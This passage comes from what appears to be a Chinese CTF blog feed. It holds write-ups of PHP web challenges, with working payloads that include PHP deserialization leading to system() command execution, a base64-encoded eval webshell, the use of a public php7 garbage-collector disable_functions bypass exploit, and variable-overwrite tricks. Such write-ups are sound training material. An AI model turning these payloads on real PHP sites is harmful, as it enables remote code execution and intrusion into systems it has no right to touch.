class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> HelloPhp;<br><span class="hljs-variable">$test</span>-&gt;a=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br><span class="hljs-variable">$test</span>-&gt;b=<span class="hljs-string">&quot;assert&quot;</span>;<br><span class="hljs-comment">//这里我试了上面所说的所有函数 只有assert函数成功执行</span><br><span class="hljs-comment">//猜测是做了过滤</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/02/HLZ7COnpgKdU2hM.png" alt="44238-dbv82deg62h.png"></p><p>将序列化结果提交后得到phpinfo()信息</p><p><img src="https://i.loli.net/2021/03/02/mcPbrj9Q4v5aiol.png" alt="45094-hn9guiehdl.png"></p><p>在页面中搜索flag<br><img src="https://i.loli.net/2021/03/02/fzRn8Qx1DipoLuK.png" alt="63274-3pz0atctj14.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯 2020 朱雀组phpweb</title>
    <link href="/2022/03/03/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84phpweb/"/>
    <url>/2022/03/03/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84phpweb/</url>
    
    <content type="html"><![CDATA[<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>12&#x2F;6&#x2F;2020</p><p>多云    正常</p><p>打开题目发现页面报错  会定时刷新  每次的时间都是会变的</p><p>先bp抓包看看</p><p>发现post的数据</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs php">func=date&amp;p=Y-m-d+h%<span class="hljs-number">3</span>Ai%<span class="hljs-number">3</span>As+a<br></code></pre></td></tr></table></figure><p>猜测func是函数 p是命令</p><p>根据猜想使用system函数试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">func=system&amp;p=ls<br></code></pre></td></tr></table></figure><p>回显Hacker 这里可以注入</p><p>先看页面源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">func=highlight_file&amp;p=index.php<br></code></pre></td></tr></table></figure><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable language_">$this</span>-&gt;func, <span class="hljs-variable language_">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>编写反序列化脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;shell_exec&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;proc_open&quot;</span>, <span class="hljs-string">&quot;show_source&quot;</span>, <span class="hljs-string">&quot;phpinfo&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;proc_terminate&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;escapeshellcmd&quot;</span>, <span class="hljs-string">&quot;escapeshellarg&quot;</span>, <span class="hljs-string">&quot;assert&quot;</span>, <span class="hljs-string">&quot;substr_replace&quot;</span>, <span class="hljs-string">&quot;call_user_func_array&quot;</span>, <span class="hljs-string">&quot;call_user_func&quot;</span>, <span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_map&quot;</span>, <span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>, <span class="hljs-string">&quot;register_tick_function&quot;</span>, <span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>, <span class="hljs-string">&quot;pcntl_exec&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>, <span class="hljs-string">&quot;fwrite&quot;</span>, <span class="hljs-string">&quot;file_put_contents&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable language_">$this</span>-&gt;func, <span class="hljs-variable language_">$this</span>-&gt;p);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span>-&gt;p = <span class="hljs-string">&quot;find / -name &#x27;flag *&#x27;&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;func = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>))<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>get传入数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">func=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>发现&#x2F;tmp&#x2F;flagoefiu4r93</p><p>传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">func=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GKCTF2020 CheckIN</title>
    <link href="/2022/03/03/GKCTF2020-CheckIN/"/>
    <url>/2022/03/03/GKCTF2020-CheckIN/</url>
    
    <content type="html"><![CDATA[<h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h3><p>12&#x2F;5&#x2F;2020</p><p>晴    正常</p><p>发现源码  代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><pre><code class="hljs php">&lt;title&gt;Check_In&lt;/title&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassName</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$decode</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;code = @<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">x</span>()[<span class="hljs-string">&#x27;Ginkgo&#x27;</span>];<br>                <span class="hljs-variable language_">$this</span>-&gt;decode = @<span class="hljs-title function_ invoke__">base64_decode</span>( <span class="hljs-variable language_">$this</span>-&gt;code );<br>                @<span class="hljs-title function_ invoke__">Eval</span>(<span class="hljs-variable language_">$this</span>-&gt;decode);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$_REQUEST</span>;<br>        &#125;<br>&#125;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassName</span>();<br></code></pre></td></tr></table></figure><p>代码大致意思就是 传参Ginkgo 经过base64解码  eval执行</p><p>可以想到传入一句话木马<br>要进行base64编码<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<br>?Ginkgo=ZXZhbCgkX1BPU1RbY21kXSk7==<br></code></pre></td></tr></table></figure><p>传入后使用蚁剑连接  发现flag打不开  只有一个readflag</p><p>php版本为7.3<br>这个版本有一个漏洞<br>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令<br>影响范围是linux，php7.0-7.3<br>给出exp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php<br></code></pre></td></tr></table></figure><p>下载exp后更改pwn（）里面的文件为&#x2F;readflag</p><p>从蚁剑上传到&#x2F;tmp 目录下 因为此目录的权限较高<br>上传后使用上面的一句话来包含这个文件<br>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">?Ginkgo=ZXZhbCgkX1BPU1RbY21kXSk7==<br><br>post:<br>cmd=include(&quot;/tmp/exp.php&quot;);<br></code></pre></td></tr></table></figure><p>提交后获得flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020Mark loves 变量覆盖</title>
    <link href="/2022/03/03/BJDCTF2020Mark-loves-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    <url>/2022/03/03/BJDCTF2020Mark-loves-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
    
    <content type="html"><![CDATA[<h3 id="BJDCTF2020-Mark-loves-变量覆盖"><a href="#BJDCTF2020-Mark-loves-变量覆盖" class="headerlink" title="[BJDCTF2020]Mark loves 变量覆盖"></a>[BJDCTF2020]Mark loves 变量覆盖</h3><p>12&#x2F;2&#x2F;2020</p><p>雨   还好</p><p>拿到这一题点了一圈 都是指向index.php这个首页  打算使用dirsearch扫描后台</p><p>把线程设置为1 并且过滤状态码 只显示状态码为200的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">python.exe .\dirsearch.py -u &quot;http://d2c9fb28-dd05-4402-9a8d-124d3454bfa2.node3.buuoj.cn/&quot; --timeout=2 -t 1 -x 400,401,404,500,503,429<br></code></pre></td></tr></table></figure><p>扫描到&#x2F;.git目录  源码泄露</p><p>使用githack 下载源码</p><p>提取有用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;     <span class="hljs-comment">//$key $value 就是一个变量 变量名可以自定义  此时将POST传的值作为键值对进行变量覆盖</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;     <span class="hljs-comment">//此时将GET传的值作为键值对进行变量覆盖</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);   <span class="hljs-comment">//GET参数中flag为键值 且键值不为flag</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);   <span class="hljs-comment">//不存在get型flag参数 且 不存在post型flag参数</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);  <span class="hljs-comment">//POST型flag参数为flag 或者 GET型flag参数为flag</span><br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>$$导致的变量覆盖问题</p><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</p><p>看第一个if语句前半段 接受一个GET型的flag参数 经过foreach语句后 $x&#x3D;flag 后半段要求$x不等于flag 自相矛盾 下一个</p><p>第二个if语句 不存在get型flag参数 且 不存在post型flag参数 此时只要接受的参数不为flag就能输出$yds 我们想要的值是$flag 只要将$yds&#x3D;$flag就可以了 利用变量覆盖漏洞 进行get传参 payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?yds=flag<br></code></pre></td></tr></table></figure><p>变量覆盖过程：<br>传入的yds为$x flag为$y 经过变量覆盖后 $ysd&#x3D;$flag</p><p>提交后查看源码获得flag</p><p>第三条if语句 POST型flag参数为flag 或者 GET型flag参数为flag  </p><p>从post型flag&#x3D;flag开始：</p><p>我们post的数据，会在这一步，把原来的$flag的值改变，因为​$x&#x3D;flag,$y&#x3D;flag，然后带进去变成了​$flag&#x3D;flag。over，原来的flag值被我们整没了，这条路不通</p><p>试试get型的flag&#x3D;flag：<br>首先是$x&#x3D;is,$y&#x3D;flag,带进去就变成了$is&#x3D;$flag;<br>现在到了第二个参数,$x&#x3D;flag,$y&#x3D;flag，带进去变成$flag&#x3D;$flag，自己变成自己，没啥影响，没有改变flag 的值，成功。<br>payload </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?is=flag&amp;flag=flag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020 Ez_bypass</title>
    <link href="/2022/03/03/MRCTF2020-Ez-bypass/"/>
    <url>/2022/03/03/MRCTF2020-Ez-bypass/</url>
    
    <content type="html"><![CDATA[<h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><p>11&#x2F;30&#x2F;2020</p><p>晴空万里    正常</p><p>F12查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 